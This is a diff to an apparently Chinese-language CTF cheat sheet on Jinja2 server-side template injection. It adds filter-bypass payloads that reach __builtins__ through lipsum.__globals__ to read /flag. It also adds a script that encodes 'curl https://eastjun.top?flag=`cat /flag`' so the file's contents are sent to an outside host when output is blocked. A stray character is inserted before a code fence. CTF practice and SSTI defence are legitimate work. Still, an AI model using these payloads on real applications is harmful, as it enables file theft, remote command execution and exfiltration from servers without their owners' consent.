@@ -1,4 +1,4 @@
-```
+g```
 __class__            类的一个内置属性，表示实例对象的类。
 __base__             类型对象的直接基类
 __bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
@@ -260,4 +260,38 @@ lipsum.__globals__['__builtins__'].open('/flag').read()
 {
    % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
 
+```
+
+
+^
+## **过滤数字**
+```
+{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
+{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
+{%set x=(()|select|string|list).pop(num)%}
+{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
+{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
+{%set c = dict(chr=a)|join%}
+{%set o = dict(o=a,s=a)|join%}
+{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
+{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
+{%set file = chr(numm)~dict(flag=a)|join%}
+{%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%}
+```
+
+^
+## **过滤print关键词，不回显**
+
+用curl外带
+脚本
+```
+import re
+def filting(s):
+    return "".join([f"chr({ord(i)})~" for i in s])[:-1]
+cmd=filting("curl https://eastjun.top?flag=`cat /flag`")
+nums = set(re.findall("(\d+)",cmd))
+for i in nums:
+    patnum = "".join(["zero~" if j=="0" else f'{"e" * int(j)}~' for j in f"{i}"])
+    cmd = cmd.replace(f"{i}",f"({patnum[:-1]})|int")
+print(cmd)
 ```
